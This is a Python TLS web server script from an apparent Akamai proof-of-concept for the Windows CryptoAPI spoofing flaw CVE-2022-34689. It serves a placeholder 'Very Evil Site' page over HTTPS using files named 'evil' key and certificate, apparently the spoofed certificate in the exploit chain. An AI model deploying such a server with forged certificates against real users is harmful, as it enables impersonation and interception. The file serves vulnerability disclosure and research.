# serve_evil.py:
# Nothing more than a regular TLS web server.

 # CVE-2022-34689 PoC code
 # Copyright 2023 Akamai Technologies, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the
 # "License"); you may not use this file except in
 # compliance with the License.  You may obtain a copy
 # of the License at
 #
 #   https://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in
 # writing, software distributed under the License is
 # distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 # CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing
 # permissions and limitations under the License.
 #
 
import http.server
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

import ssl
class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        print (f"Recived GET path: {self.path}")
        if self.path == "/":
            self.path = "index.html"
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        if "ello" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            name = "World!!"
            html = f"<html><head></head><body><h1>Very Evil Site</h1><a href="">Malicious Link</a></body></html>"
            self.wfile.write(bytes(html,"utf8"))
        else:
            self.send_response(403)
            self.end_headers()

if __name__ == '__main__':
    '''path = input("File name: ")
    file = open(path, "rb+")
    out = open("out.txt","wb+")
    content = file.read(1024)
    out.write(content)'''
    flag = False
    while not flag:
        try:
            httpd = HTTPServer(('192.168.0.180', 443), SimpleHTTPRequestHandler)

            httpd.socket = ssl.wrap_socket(httpd.socket,
                                           keyfile="evil_key.pem",
                                           certfile="evil.crt", server_side=True)
            print(f"[V] Started serving evil site")
            httpd.serve_forever()
            flag = True
        except OSError:
            print("[*]Waiting for socket to release...")
            time.sleep(5)

